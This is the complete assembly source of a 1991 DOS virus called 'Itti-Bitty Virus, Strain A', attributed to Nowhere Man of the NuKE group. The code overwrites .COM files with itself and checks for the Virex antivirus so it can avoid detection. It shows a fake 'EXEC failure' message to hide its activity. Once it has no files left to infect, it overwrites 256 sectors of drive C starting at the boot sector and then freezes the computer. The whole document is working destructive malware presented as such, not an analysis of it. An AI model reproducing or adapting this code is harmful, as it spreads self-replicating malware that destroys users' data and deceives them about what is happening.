; Itti-Bitty Virus, Strain A
; The world's smallest virus (except for Strain B, but still only 161 bytes)
;
; (C) 1991 Nowhere Man and [NuKE] WaErZ
; Written by Nowhere Man

	title   "The Itti-Bitty Virus, Strain A:  The smallest virus ever"

        code    segment 'CODE'
                assume cs:code,ds:code,es:code,ss:code

                org     0100h

code_length     equ     finish - start

start           label   near
               
id_bytes	proc	near
		mov	si,si                   ; Serves no purpose:  our ID
id_bytes	endp

main            proc    near
		mov	ax,0FF0Fh		; Virex installation check function
		int	021h
		cmp	ax,0101h		; Is Virex loaded?
		je	exit_virus		; If so, then bail out now

		mov     ah,04Eh			; DOS find first file function
		mov     cx,00100111b		; CX holds attribute mask
		mov     dx,offset com_spec	; DX points to "*.COM"

file_loop:      int     021h
		jc      go_off			; If there are no files, go off

		call    infect_file		; Try to infect found file
		jne     exit_virus		; Exit if successful

                mov     ah,04Fh			; DOS find next file function
		jmp	short file_loop		; Repeat until out of files

exit_virus:     mov	ah,9			; DOS display string function
		mov	dx,offset fake_error	; DX points to fake error message
		int	021h

		mov	ax,04C01h		; DOS terminate function, code 1
		int     021h
main            endp

go_off          proc    near
		cli				; Prevent all interrupts

		mov	ah,2			; AH holds drive number (C:)
		cwd                             ; Start with sector 0 (boot sector)
		mov	cx,0100h		; Write 256 sectors (fucks disk)
		int	026h			; DOS absolute write interrupt

		jmp	$			; Infinite loop; lock up computer
go_off          endp

infect_file     proc    near
		mov	ax,04301h		; DOS set file attributes function
		xor	cx,cx			; Clear all attributes
		mov	dx,09Eh			; DX points to victim's name
		int	021h

		mov     ax,03D02h               ; DOS open file function, read-write
		int     021h

                xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,2                    ; CX holds byte to read (2)
		mov     dx,offset buffer        ; DX points to buffer
		int     021h

		cmp	word ptr [buffer],0F68Bh ; Are the two bytes "MOV SI,SI"
		pushf				; Save flags
		je      close_it_up		; If not, then file is OK

		cwd                             ; Zero CX \_ Zero bytes from start
		mov	cx,dx			; Zero DX /
		mov	ax,04200h		; DOS file seek function, start
		int	021h

		mov     ah,040h                 ; DOS write to file function
		mov     cx,code_length          ; CX holds virus length
		mov     dx,offset start         ; DX points to start of virus
		int     021h

close_it_up:	mov	si,095h
		lodsb
		push	ax			; Save file's attributes for later
		lodsw
		xchg	cx,ax			; CX holds [096h]
		lodsw
		xchg	dx,ax			; DX holds [098h]
		mov     ax,05701h               ; DOS set file time function
		int     021h

                mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov	ax,04301h		; DOS set file attributes function
		pop	cx			; CX holds file's old attributes
		mov	dx,09Eh			; DX points to victim's name
		int	021h

		popf				; Restore flags
		ret				; Return to caller

buffer          dw      ?			; Buffer to hold test data
infect_file	endp


; Initialized data goes here

com_spec        db      "*.COM",0		; What to infect:  all COM files

fake_error	db	"EXEC failure",13,10,"$" ; Fake error message

finish          label   near

code            ends
		end	id_bytes